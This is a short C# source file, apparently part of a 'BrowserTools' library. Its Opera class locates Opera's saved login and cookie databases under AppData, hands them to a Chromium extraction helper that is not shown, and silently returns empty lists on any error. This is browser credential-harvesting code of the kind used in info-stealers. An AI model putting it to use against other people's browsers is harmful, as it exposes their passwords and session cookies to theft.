using BrowserTools.Base;
using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserTools
{
    public class Opera
    {
        public static List<LoginData> GetLoginData()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Login Data");

                return Chromium.GetLoginData(dataPath, BrowserName.Opera);
            }
            catch (Exception)
            {
                return new List<LoginData>();
            }
        }

        public static List<Cookie> GetCookies()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Cookies");

                return Chromium.GetCookies(dataPath, BrowserName.Opera);
            }
            catch (Exception)
            {
                return new List<Cookie>();
            }
        }
    }
}
